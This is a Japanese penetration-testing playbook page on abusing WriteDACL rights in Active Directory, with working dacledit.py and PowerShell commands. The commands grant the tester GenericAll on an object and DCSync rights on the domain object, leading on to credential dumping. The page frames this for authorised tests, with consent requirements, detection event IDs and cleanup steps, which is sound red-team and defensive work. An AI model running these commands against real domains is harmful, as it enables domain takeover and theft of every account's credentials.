# WriteDACL の悪用

> **スコープ**: BloodHound で `WriteDACL` エッジ確認後、対象オブジェクトの DACL（Discretionary Access Control List）を変更して権限昇格する。GenericAll 権限の自己付与〜DCSync 権限付与まで扱う。

> **[HIGH IMPACT]** 本攻撃は以下の理由で本番では原則禁止または個別合意必須：
> - [ ] 業務停止リスク（サービス・認証）
> - [x] 持続化に該当（ドメインオブジェクトへの DCSync 権限自己付与は壊滅的影響）
> - [x] 不可逆な設定変更を含む（DACL の追加変更）
> - [x] SIEM/EDR で確実に検知される（Event ID 5136 ディレクトリサービスオブジェクト変更、AD 監査ログ）
>
> 実施可否は事前合意で明示確認すること。付与した ACE の削除（原状回復）必須。演習環境（HTB / OSCP 等）では制約なし。

## 着火条件

BloodHound で `[現在のユーザー or グループ] --WriteDACL--> [ターゲットオブジェクト]` が確認できた場合。

## 環境前提
- 実行環境: テスター端末
- 必要なツール: `dacledit.py`（Impacket 付属・ペネトレ用 Linux ディストリ標準搭載）または PowerShell（Windows シェル取得済みの場合）

## 先に確認すること

- **変更前の DACL を BloodHound 等で記録しておく**（テスト完了時に同等の状態へ戻すため）
- **ドメインオブジェクト自体（`DC=domain,DC=tld`）への WriteDACL は特に高インパクト**（DCSync 権限の自己付与が可能）

**攻撃者の思考トレース:** WriteDACL は「自分自身に GenericAll を付与」→「GenericAll の操作を実行」の 2 ステップで完結する間接的な完全制御権限。ドメインオブジェクトへの WriteDACL なら DCSync 権限を直接自己付与できる。

---

## 1. 自分自身に GenericAll を付与する

**コマンド（dacledit.py）:**

```bash
# [Attacker] impacket の dacledit で FullControl 権限を自分に付与
dacledit.py -action write \
  -rights FullControl \
  -principal '[CURRENT_USER]' \
  -target '[TARGET_OBJECT]' \
  '[DOMAIN]/[CURRENT_USER]:[PASSWORD]' \
  -dc-ip [DC_IP]
```

**コマンド（PowerShell / Windows シェル内から）:**

```powershell
# [Target]
$ACL = Get-ACL "AD:[TARGET_OBJECT_DN]"
$SID = (Get-ADUser [CURRENT_USER]).SID
$ACE = New-Object System.DirectoryServices.ActiveDirectoryAccessRule(
    $SID,
    [System.DirectoryServices.ActiveDirectoryRights]::GenericAll,
    [System.Security.AccessControl.AccessControlType]::Allow
)
$ACL.AddAccessRule($ACE)
Set-ACL "AD:[TARGET_OBJECT_DN]" $ACL
```

**観測される出力 → 次のアクション:**

| 出力 | 示唆 | 次のアクション |
|---|---|---|
| エラーなく完了 | GenericAll 自己付与成功 | §3 GenericAll.md の手法を実行 |

---

## 2. 付与した GenericAll を使って目的の操作を実施

**詳細 → `GenericAll.md` の手法を適用**

---

## 3. ドメインオブジェクトへの WriteDACL — DCSync 権限の自己付与

**着火条件:** ドメインオブジェクト自体（`DC=domain,DC=tld`）に WriteDACL がある場合。

**コマンド:**

```bash
# [Attacker] DS-Replication-Get-Changes と DS-Replication-Get-Changes-All を付与
dacledit.py -action write \
  -rights DCSync \
  -principal '[CURRENT_USER]' \
  -target-dn 'DC=[DOMAIN],DC=[TLD]' \
  '[DOMAIN]/[CURRENT_USER]:[PASSWORD]' \
  -dc-ip [DC_IP]
```

**観測される出力 → 次のアクション:**

| 出力 | 示唆 | 次のアクション |
|---|---|---|
| エラーなく完了 | DCSync 権限自己付与成功 | DCSync を実行 → `../Credential_Dumping.md` |

**注意（原状回復）:** 自己付与した DCSync 権限（`DS-Replication-Get-Changes` / `DS-Replication-Get-Changes-All`）を削除する（`dacledit.py -action remove`）。

---

## 刺さらなかったとき（全体）

| 状況 | 推定原因 | 代替手段 |
|---|---|---|
| dacledit.py でエラー | 権限が実際にない / ターゲット DN が間違い | BloodHound で WriteDACL エッジの向きを再確認 |
| GenericAll を付与したが操作できない | セッションの権限が更新されていない | 新しいセッションを開いて再試行 |

---

## 注意点・落とし穴

- DACL の変更はイベントログに記録される（セキュリティ上の痕跡が残る）
- ドメインオブジェクトへの変更は特に影響が大きいため慎重に操作する
- 変更前の DACL を記録しておくことが原状回復の前提

---

## 本番での前提

- **事前合意の要否**: ★★★（書面承認必須）。ドメインオブジェクトへの DCSync 権限自己付与はドメイン全体に対する壊滅的影響を持つ
- **想定されるSIEM/EDR検知**: Event ID 5136（ディレクトリサービスオブジェクトの変更：DACL 編集）/ Event ID 4670（オブジェクトの権限変更）/ Defender for Identity の DACL 改ざんアラート
- **業務影響リスク**: なし（参照権限の追加のみだが、悪用されると全ドメイン認証情報流出の起点となる）
- **原状回復必須項目**: ✅ 自己付与した GenericAll / DCSync 権限の削除（`dacledit.py -action remove`）/ ✅ 変更前の DACL と同等の状態へ戻す / ✅ 派生して取得した認証情報は `Credential_Dumping.md` の原状回復項目に従う
- **演習環境での扱い**: 制約なし（HTB / OSCP 等は本セクション全項目をスキップしてよい）

---

## 関連技術

- 前：BloodHound で WriteDACL 権限を発見後 → `../../05_Tools_Reference/BloodHound.md`
- 後：GenericAll を自己付与後に実施する操作 → `GenericAll.md`
- 後：DCSync 権限付与後に DCSync を実行 → `../Credential_Dumping.md`
